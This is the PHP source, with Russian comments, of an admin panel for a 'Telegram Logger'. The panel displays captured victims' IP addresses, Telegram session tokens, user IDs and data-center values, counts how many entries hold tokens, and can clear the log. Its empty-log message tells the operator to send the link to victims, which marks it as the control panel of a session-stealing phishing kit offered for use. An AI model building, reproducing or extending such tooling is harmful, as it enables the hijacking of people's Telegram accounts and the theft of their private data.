<?php
/**
 * Admin panel for Telegram Logger
 * Доступ: https://твой-сайт.vercel.app/api/admin?key=твой_пароль
 */

// ========== КОНФИГУРАЦИЯ ==========
define('ADMIN_KEY', 'supersecret123456'); // СМЕНИ НА СВОЙ ПАРОЛЬ!
define('LOG_FILE', '/tmp/telegram_log.txt');

// Проверка пароля
if (!isset($_GET['key']) || $_GET['key'] !== ADMIN_KEY) {
    http_response_code(403);
    die('Access Denied');
}

// Действия
$action = $_GET['action'] ?? 'view';

// Очистка логов
if ($action === 'clear' && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
    @unlink(LOG_FILE);
    header('Location: ?key=' . ADMIN_KEY);
    exit;
}

// Статистика
if ($action === 'stats') {
    $lines = file_exists(LOG_FILE) ? count(file(LOG_FILE)) : 0;
    $size = file_exists(LOG_FILE) ? filesize(LOG_FILE) : 0;
    
    header('Content-Type: application/json');
    echo json_encode([
        'entries' => $lines,
        'size_bytes' => $size,
        'size_kb' => round($size / 1024, 2),
        'file_exists' => file_exists(LOG_FILE)
    ]);
    exit;
}

// HTML страница
?>
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Logger Admin</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: #0d1117; 
            color: #c9d1d9; 
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #58a6ff; margin-bottom: 20px; }
        .menu { margin: 20px 0; display: flex; gap: 10px; flex-wrap: wrap; }
        .menu a, .menu button {
            background: #21262d;
            color: #c9d1d9;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            border: 1px solid #30363d;
            cursor: pointer;
            font-size: 14px;
        }
        .menu a:hover, .menu button:hover { background: #30363d; }
        .stats {
            background: #161b22;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
        }
        .stat-item {
            background: #21262d;
            padding: 15px;
            border-radius: 6px;
            text-align: center;
        }
        .stat-label { color: #8b949e; font-size: 12px; }
        .stat-value { color: #58a6ff; font-size: 24px; font-weight: bold; }
        .logs {
            background: #161b22;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
        }
        .log-entry {
            background: #21262d;
            padding: 15px;
            margin: 10px 0;
            border-radius: 6px;
            border-left: 4px solid #238636;
            font-family: monospace;
            font-size: 13px;
            overflow-x: auto;
        }
        .log-time { color: #ff7b72; }
        .log-ip { color: #79c0ff; }
        .log-token { color: #d2a8ff; }
        .refresh-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #238636;
            color: white;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            font-size: 24px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
        }
        .refresh-btn:hover { background: #2ea043; }
        pre { white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Telegram Logger Control Panel</h1>
        
        <div class="menu">
            <a href="?key=<?php echo ADMIN_KEY; ?>">📋 Логи</a>
            <a href="?key=<?php echo ADMIN_KEY; ?>&action=stats" target="_blank">📊 Статистика (JSON)</a>
            <a href="?key=<?php echo ADMIN_KEY; ?>&action=clear&confirm=yes" onclick="return confirm('Очистить все логи?')">🗑️ Очистить</a>
            <button onclick="window.location.reload()">🔄 Обновить</button>
        </div>
        
        <?php if (file_exists(LOG_FILE)): 
            $logs = file(LOG_FILE);
            $logs = array_reverse($logs);
            $tokenCount = 0;
            
            // Подсчет токенов
            foreach ($logs as $line) {
                if (strpos($line, '"token":"none"') === false && strpos($line, 'token') !== false) {
                    $tokenCount++;
                }
            }
        ?>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-label">Всего записей</div>
                <div class="stat-value"><?php echo count($logs); ?></div>
            </div>
            <div class="stat-item">
                <div class="stat-label">С токенами</div>
                <div class="stat-value"><?php echo $tokenCount; ?></div>
            </div>
            <div class="stat-item">
                <div class="stat-label">Размер лога</div>
                <div class="stat-value"><?php echo round(filesize(LOG_FILE) / 1024, 2); ?> KB</div>
            </div>
        </div>
        
        <div class="logs">
            <h3>📋 Последние записи:</h3>
            <?php foreach (array_slice($logs, 0, 50) as $line): 
                if (preg_match('/^(.+?) \| (.+)$/', $line, $matches)) {
                    $time = $matches[1];
                    $data = json_decode($matches[2], true);
                ?>
                <div class="log-entry">
                    <div><span class="log-time">🕐 <?php echo $time; ?></span></div>
                    <?php if ($data): ?>
                        <div><span class="log-ip">📡 IP: <?php echo $data['ip'] ?? 'unknown'; ?></span></div>
                        <?php if (($data['token'] ?? '') !== 'none'): ?>
                            <div><span class="log-token">🔑 TOKEN: <?php echo $data['token'] ?? ''; ?></span></div>
                            <div>👤 User: <?php echo $data['user_id'] ?? ''; ?></div>
                            <div>🌐 DC: <?php echo $data['dc'] ?? ''; ?></div>
                        <?php endif; ?>
                        <details>
                            <summary style="margin-top: 10px; color: #8b949e;">Полные данные</summary>
                            <pre><?php print_r($data); ?></pre>
                        </details>
                    <?php else: ?>
                        <div><?php echo htmlspecialchars($line); ?></div>
                    <?php endif; ?>
                </div>
            <?php } 
            } else { ?>
                <div class="logs">
                    <p>📭 Логов пока нет. Отправь ссылку жертвам.</p>
                </div>
            <?php } ?>
    </div>
    
    <a href="javascript:void(0)" onclick="window.location.reload()" class="refresh-btn" title="Обновить">↻</a>
    
    <script>
    // Автообновление каждые 30 секунд
    setTimeout(function() {
        window.location.reload();
    }, 30000);
    </script>
</body>
</html>